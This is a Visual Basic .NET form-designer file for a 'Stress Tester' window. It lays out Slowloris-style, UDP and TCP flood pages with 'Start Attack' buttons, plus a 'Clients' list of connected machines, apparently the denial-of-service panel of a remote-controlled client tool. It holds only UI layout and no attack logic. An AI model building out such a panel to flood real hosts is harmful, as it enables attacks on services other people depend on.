<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class StressTester
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(StressTester))
        Me.CustomTabcontrol1 = New LuxNET.CustomTabcontrol()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.TabControl1 = New System.Windows.Forms.TabControl()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.btn_stopsl = New System.Windows.Forms.Button()
        Me.btn_startsl = New System.Windows.Forms.Button()
        Me.NUD_AOT_SL = New System.Windows.Forms.NumericUpDown()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.NUD_AoS_Sl = New System.Windows.Forms.NumericUpDown()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.tb_slurl = New System.Windows.Forms.TextBox()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.btn_stop2 = New System.Windows.Forms.Button()
        Me.btn_start2 = New System.Windows.Forms.Button()
        Me.NUD_AOT_UDP = New System.Windows.Forms.NumericUpDown()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.tb_portudp = New System.Windows.Forms.NumericUpDown()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.tb_ipudp = New System.Windows.Forms.TextBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.btn_stoptcp = New System.Windows.Forms.Button()
        Me.btn_starttcp = New System.Windows.Forms.Button()
        Me.nud_tcp_threads = New System.Windows.Forms.NumericUpDown()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.nud_tcp_size = New System.Windows.Forms.NumericUpDown()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.tb_tcp_ip = New System.Windows.Forms.TextBox()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.StatusBar1 = New System.Windows.Forms.StatusStrip()
        Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.LV_Clients = New ComponentOwl.BetterListView.BetterListView()
        Me.BetterListViewColumnHeader1 = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.BetterListViewColumnHeader2 = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.IL_StressTester = New System.Windows.Forms.ImageList(Me.components)
        Me.IL_Clients = New System.Windows.Forms.ImageList(Me.components)
        Me.CustomTabcontrol1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.TabControl1.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        CType(Me.NUD_AOT_SL, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NUD_AoS_Sl, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage4.SuspendLayout()
        CType(Me.NUD_AOT_UDP, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.tb_portudp, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage5.SuspendLayout()
        CType(Me.nud_tcp_threads, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.nud_tcp_size, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage2.SuspendLayout()
        Me.StatusBar1.SuspendLayout()
        CType(Me.LV_Clients, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'CustomTabcontrol1
        '
        Me.CustomTabcontrol1.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.CustomTabcontrol1.Controls.Add(Me.TabPage1)
        Me.CustomTabcontrol1.Controls.Add(Me.TabPage2)
        Me.CustomTabcontrol1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.CustomTabcontrol1.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed
        Me.CustomTabcontrol1.Font = New System.Drawing.Font("Segoe UI", 10.0!)
        Me.CustomTabcontrol1.ImageList = Me.IL_StressTester
        Me.CustomTabcontrol1.ItemSize = New System.Drawing.Size(40, 150)
        Me.CustomTabcontrol1.Location = New System.Drawing.Point(0, 0)
        Me.CustomTabcontrol1.Multiline = True
        Me.CustomTabcontrol1.Name = "CustomTabcontrol1"
        Me.CustomTabcontrol1.SelectedIndex = 0
        Me.CustomTabcontrol1.SelectedItemColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(10, Byte), Integer), CType(CType(100, Byte), Integer), CType(CType(200, Byte), Integer))
        Me.CustomTabcontrol1.Size = New System.Drawing.Size(652, 282)
        Me.CustomTabcontrol1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.CustomTabcontrol1.TabIndex = 0
        '
        'TabPage1
        '
        Me.TabPage1.Controls.Add(Me.TabControl1)
        Me.TabPage1.Location = New System.Drawing.Point(154, 4)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(494, 274)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Attack"
        Me.TabPage1.UseVisualStyleBackColor = True
        '
        'TabControl1
        '
        Me.TabControl1.Controls.Add(Me.TabPage3)
        Me.TabControl1.Controls.Add(Me.TabPage4)
        Me.TabControl1.Controls.Add(Me.TabPage5)
        Me.TabControl1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TabControl1.Location = New System.Drawing.Point(3, 3)
        Me.TabControl1.Name = "TabControl1"
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Size = New System.Drawing.Size(488, 268)
        Me.TabControl1.TabIndex = 0
        '
        'TabPage3
        '
        Me.TabPage3.Controls.Add(Me.btn_stopsl)
        Me.TabPage3.Controls.Add(Me.btn_startsl)
        Me.TabPage3.Controls.Add(Me.NUD_AOT_SL)
        Me.TabPage3.Controls.Add(Me.Label3)
        Me.TabPage3.Controls.Add(Me.NUD_AoS_Sl)
        Me.TabPage3.Controls.Add(Me.Label2)
        Me.TabPage3.Controls.Add(Me.tb_slurl)
        Me.TabPage3.Controls.Add(Me.Label1)
        Me.TabPage3.Location = New System.Drawing.Point(4, 26)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage3.Size = New System.Drawing.Size(480, 238)
        Me.TabPage3.TabIndex = 0
        Me.TabPage3.UseVisualStyleBackColor = True
        '
        'btn_stopsl
        '
        Me.btn_stopsl.Location = New System.Drawing.Point(308, 154)
        Me.btn_stopsl.Name = "btn_stopsl"
        Me.btn_stopsl.Size = New System.Drawing.Size(122, 27)
        Me.btn_stopsl.TabIndex = 7
        Me.btn_stopsl.Text = "Stop Attack"
        Me.btn_stopsl.UseVisualStyleBackColor = True
        '
        'btn_startsl
        '
        Me.btn_startsl.Location = New System.Drawing.Point(178, 154)
        Me.btn_startsl.Name = "btn_startsl"
        Me.btn_startsl.Size = New System.Drawing.Size(122, 27)
        Me.btn_startsl.TabIndex = 6
        Me.btn_startsl.Text = "Start Attack"
        Me.btn_startsl.UseVisualStyleBackColor = True
        '
        'NUD_AOT_SL
        '
        Me.NUD_AOT_SL.Location = New System.Drawing.Point(178, 123)
        Me.NUD_AOT_SL.Maximum = New Decimal(New Integer() {150, 0, 0, 0})
        Me.NUD_AOT_SL.Name = "NUD_AOT_SL"
        Me.NUD_AOT_SL.Size = New System.Drawing.Size(252, 25)
        Me.NUD_AOT_SL.TabIndex = 5
        Me.NUD_AOT_SL.Value = New Decimal(New Integer() {70, 0, 0, 0})
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(41, 125)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(134, 19)
        Me.Label3.TabIndex = 4
        Me.Label3.Text = "Amount of Threads :"
        '
        'NUD_AoS_Sl
        '
        Me.NUD_AoS_Sl.Location = New System.Drawing.Point(178, 87)
        Me.NUD_AoS_Sl.Maximum = New Decimal(New Integer() {9999, 0, 0, 0})
        Me.NUD_AoS_Sl.Name = "NUD_AoS_Sl"
        Me.NUD_AoS_Sl.Size = New System.Drawing.Size(252, 25)
        Me.NUD_AoS_Sl.TabIndex = 3
        Me.NUD_AoS_Sl.Value = New Decimal(New Integer() {100, 0, 0, 0})
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(41, 89)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(120, 19)
        Me.Label2.TabIndex = 2
        Me.Label2.Text = "Socks per Thread :"
        '
        'tb_slurl
        '
        Me.tb_slurl.Location = New System.Drawing.Point(178, 51)
        Me.tb_slurl.Name = "tb_slurl"
        Me.tb_slurl.Size = New System.Drawing.Size(252, 25)
        Me.tb_slurl.TabIndex = 1
        Me.tb_slurl.Text = "http://example.com"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(41, 54)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(131, 19)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "URL or Host-name :"
        '
        'TabPage4
        '
        Me.TabPage4.Controls.Add(Me.btn_stop2)
        Me.TabPage4.Controls.Add(Me.btn_start2)
        Me.TabPage4.Controls.Add(Me.NUD_AOT_UDP)
        Me.TabPage4.Controls.Add(Me.Label4)
        Me.TabPage4.Controls.Add(Me.tb_portudp)
        Me.TabPage4.Controls.Add(Me.Label5)
        Me.TabPage4.Controls.Add(Me.tb_ipudp)
        Me.TabPage4.Controls.Add(Me.Label6)
        Me.TabPage4.Location = New System.Drawing.Point(4, 26)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage4.Size = New System.Drawing.Size(480, 238)
        Me.TabPage4.TabIndex = 1
        Me.TabPage4.UseVisualStyleBackColor = True
        '
        'btn_stop2
        '
        Me.btn_stop2.Location = New System.Drawing.Point(313, 153)
        Me.btn_stop2.Name = "btn_stop2"
        Me.btn_stop2.Size = New System.Drawing.Size(122, 27)
        Me.btn_stop2.TabIndex = 15
        Me.btn_stop2.Text = "Stop Attack"
        Me.btn_stop2.UseVisualStyleBackColor = True
        '
        'btn_start2
        '
        Me.btn_start2.Location = New System.Drawing.Point(183, 153)
        Me.btn_start2.Name = "btn_start2"
        Me.btn_start2.Size = New System.Drawing.Size(122, 27)
        Me.btn_start2.TabIndex = 14
        Me.btn_start2.Text = "Start Attack"
        Me.btn_start2.UseVisualStyleBackColor = True
        '
        'NUD_AOT_UDP
        '
        Me.NUD_AOT_UDP.Location = New System.Drawing.Point(183, 122)
        Me.NUD_AOT_UDP.Maximum = New Decimal(New Integer() {150, 0, 0, 0})
        Me.NUD_AOT_UDP.Name = "NUD_AOT_UDP"
        Me.NUD_AOT_UDP.Size = New System.Drawing.Size(252, 25)
        Me.NUD_AOT_UDP.TabIndex = 13
        Me.NUD_AOT_UDP.Value = New Decimal(New Integer() {70, 0, 0, 0})
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(46, 124)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(134, 19)
        Me.Label4.TabIndex = 12
        Me.Label4.Text = "Amount of Threads :"
        '
        'tb_portudp
        '
        Me.tb_portudp.Location = New System.Drawing.Point(183, 86)
        Me.tb_portudp.Maximum = New Decimal(New Integer() {9999, 0, 0, 0})
        Me.tb_portudp.Name = "tb_portudp"
        Me.tb_portudp.Size = New System.Drawing.Size(252, 25)
        Me.tb_portudp.TabIndex = 11
        Me.tb_portudp.Value = New Decimal(New Integer() {53, 0, 0, 0})
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(46, 88)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(42, 19)
        Me.Label5.TabIndex = 10
        Me.Label5.Text = "Port :"
        '
        'tb_ipudp
        '
        Me.tb_ipudp.Location = New System.Drawing.Point(183, 50)
        Me.tb_ipudp.Name = "tb_ipudp"
        Me.tb_ipudp.Size = New System.Drawing.Size(252, 25)
        Me.tb_ipudp.TabIndex = 9
        Me.tb_ipudp.Text = "Example: 192.168.178.1"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(46, 53)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(81, 19)
        Me.Label6.TabIndex = 8
        Me.Label6.Text = "IP Address :"
        '
        'TabPage5
        '
        Me.TabPage5.Controls.Add(Me.btn_stoptcp)
        Me.TabPage5.Controls.Add(Me.btn_starttcp)
        Me.TabPage5.Controls.Add(Me.nud_tcp_threads)
        Me.TabPage5.Controls.Add(Me.Label7)
        Me.TabPage5.Controls.Add(Me.nud_tcp_size)
        Me.TabPage5.Controls.Add(Me.Label8)
        Me.TabPage5.Controls.Add(Me.tb_tcp_ip)
        Me.TabPage5.Controls.Add(Me.Label9)
        Me.TabPage5.Location = New System.Drawing.Point(4, 26)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage5.Size = New System.Drawing.Size(480, 238)
        Me.TabPage5.TabIndex = 2
        Me.TabPage5.UseVisualStyleBackColor = True
        '
        'btn_stoptcp
        '
        Me.btn_stoptcp.Location = New System.Drawing.Point(313, 155)
        Me.btn_stoptcp.Name = "btn_stoptcp"
        Me.btn_stoptcp.Size = New System.Drawing.Size(122, 27)
        Me.btn_stoptcp.TabIndex = 15
        Me.btn_stoptcp.Text = "Stop Attack"
        Me.btn_stoptcp.UseVisualStyleBackColor = True
        '
        'btn_starttcp
        '
        Me.btn_starttcp.Location = New System.Drawing.Point(183, 155)
        Me.btn_starttcp.Name = "btn_starttcp"
        Me.btn_starttcp.Size = New System.Drawing.Size(122, 27)
        Me.btn_starttcp.TabIndex = 14
        Me.btn_starttcp.Text = "Start Attack"
        Me.btn_starttcp.UseVisualStyleBackColor = True
        '
        'nud_tcp_threads
        '
        Me.nud_tcp_threads.Location = New System.Drawing.Point(183, 124)
        Me.nud_tcp_threads.Maximum = New Decimal(New Integer() {150, 0, 0, 0})
        Me.nud_tcp_threads.Name = "nud_tcp_threads"
        Me.nud_tcp_threads.Size = New System.Drawing.Size(252, 25)
        Me.nud_tcp_threads.TabIndex = 13
        Me.nud_tcp_threads.Value = New Decimal(New Integer() {70, 0, 0, 0})
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Location = New System.Drawing.Point(46, 126)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(134, 19)
        Me.Label7.TabIndex = 12
        Me.Label7.Text = "Amount of Threads :"
        '
        'nud_tcp_size
        '
        Me.nud_tcp_size.Location = New System.Drawing.Point(183, 88)
        Me.nud_tcp_size.Maximum = New Decimal(New Integer() {9999, 0, 0, 0})
        Me.nud_tcp_size.Name = "nud_tcp_size"
        Me.nud_tcp_size.Size = New System.Drawing.Size(252, 25)
        Me.nud_tcp_size.TabIndex = 11
        Me.nud_tcp_size.Value = New Decimal(New Integer() {53, 0, 0, 0})
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Location = New System.Drawing.Point(46, 90)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(83, 19)
        Me.Label8.TabIndex = 10
        Me.Label8.Text = "Packet Size :"
        '
        'tb_tcp_ip
        '
        Me.tb_tcp_ip.Location = New System.Drawing.Point(183, 52)
        Me.tb_tcp_ip.Name = "tb_tcp_ip"
        Me.tb_tcp_ip.Size = New System.Drawing.Size(252, 25)
        Me.tb_tcp_ip.TabIndex = 9
        Me.tb_tcp_ip.Text = "Example: 192.168.178.1"
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.Location = New System.Drawing.Point(46, 55)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(81, 19)
        Me.Label9.TabIndex = 8
        Me.Label9.Text = "IP Address :"
        '
        'TabPage2
        '
        Me.TabPage2.Controls.Add(Me.StatusBar1)
        Me.TabPage2.Controls.Add(Me.LV_Clients)
        Me.TabPage2.Location = New System.Drawing.Point(154, 4)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(494, 274)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Clients"
        Me.TabPage2.UseVisualStyleBackColor = True
        '
        'StatusBar1
        '
        Me.StatusBar1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel1})
        Me.StatusBar1.Location = New System.Drawing.Point(3, 249)
        Me.StatusBar1.Name = "StatusBar1"
        Me.StatusBar1.Size = New System.Drawing.Size(488, 22)
        Me.StatusBar1.TabIndex = 1
        Me.StatusBar1.Text = "StatusStrip1"
        '
        'ToolStripStatusLabel1
        '
        Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(116, 17)
        Me.ToolStripStatusLabel1.Text = "Connected Clients: 0"
        '
        'LV_Clients
        '
        Me.LV_Clients.Columns.AddRange(New Object() {Me.BetterListViewColumnHeader1, Me.BetterListViewColumnHeader2})
        Me.LV_Clients.Location = New System.Drawing.Point(6, 6)
        Me.LV_Clients.Name = "LV_Clients"
        Me.LV_Clients.Size = New System.Drawing.Size(480, 237)
        Me.LV_Clients.TabIndex = 0
        '
        'BetterListViewColumnHeader1
        '
        Me.BetterListViewColumnHeader1.Name = "BetterListViewColumnHeader1"
        Me.BetterListViewColumnHeader1.Text = "Client"
        Me.BetterListViewColumnHeader1.Width = 335
        '
        'BetterListViewColumnHeader2
        '
        Me.BetterListViewColumnHeader2.Name = "BetterListViewColumnHeader2"
        Me.BetterListViewColumnHeader2.Text = "Status"
        '
        'IL_StressTester
        '
        Me.IL_StressTester.ImageStream = CType(resources.GetObject("IL_StressTester.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.IL_StressTester.TransparentColor = System.Drawing.Color.Transparent
        Me.IL_StressTester.Images.SetKeyName(0, "shield_and_swords.png")
        Me.IL_StressTester.Images.SetKeyName(1, "25 (1).png")
        '
        'IL_Clients
        '
        Me.IL_Clients.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit
        Me.IL_Clients.ImageSize = New System.Drawing.Size(16, 16)
        Me.IL_Clients.TransparentColor = System.Drawing.Color.Transparent
        '
        'StressTester
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(652, 282)
        Me.Controls.Add(Me.CustomTabcontrol1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.MaximizeBox = False
        Me.Name = "StressTester"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Stress Tester"
        Me.CustomTabcontrol1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabControl1.ResumeLayout(False)
        Me.TabPage3.ResumeLayout(False)
        Me.TabPage3.PerformLayout()
        CType(Me.NUD_AOT_SL, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NUD_AoS_Sl, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage4.ResumeLayout(False)
        Me.TabPage4.PerformLayout()
        CType(Me.NUD_AOT_UDP, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.tb_portudp, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage5.ResumeLayout(False)
        Me.TabPage5.PerformLayout()
        CType(Me.nud_tcp_threads, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.nud_tcp_size, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        Me.StatusBar1.ResumeLayout(False)
        Me.StatusBar1.PerformLayout()
        CType(Me.LV_Clients, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents CustomTabcontrol1 As LuxNET.CustomTabcontrol
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents LV_Clients As ComponentOwl.BetterListView.BetterListView
    Friend WithEvents BetterListViewColumnHeader1 As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents BetterListViewColumnHeader2 As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents IL_StressTester As System.Windows.Forms.ImageList
    Friend WithEvents StatusBar1 As System.Windows.Forms.StatusStrip
    Friend WithEvents ToolStripStatusLabel1 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents IL_Clients As System.Windows.Forms.ImageList
    Friend WithEvents TabControl1 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage4 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage5 As System.Windows.Forms.TabPage
    Friend WithEvents btn_stopsl As System.Windows.Forms.Button
    Friend WithEvents btn_startsl As System.Windows.Forms.Button
    Friend WithEvents NUD_AOT_SL As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents NUD_AoS_Sl As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents tb_slurl As System.Windows.Forms.TextBox
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents btn_stop2 As System.Windows.Forms.Button
    Friend WithEvents btn_start2 As System.Windows.Forms.Button
    Friend WithEvents NUD_AOT_UDP As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents tb_portudp As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents tb_ipudp As System.Windows.Forms.TextBox
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents btn_stoptcp As System.Windows.Forms.Button
    Friend WithEvents btn_starttcp As System.Windows.Forms.Button
    Friend WithEvents nud_tcp_threads As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label7 As System.Windows.Forms.Label
    Friend WithEvents nud_tcp_size As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label8 As System.Windows.Forms.Label
    Friend WithEvents tb_tcp_ip As System.Windows.Forms.TextBox
    Friend WithEvents Label9 As System.Windows.Forms.Label
End Class
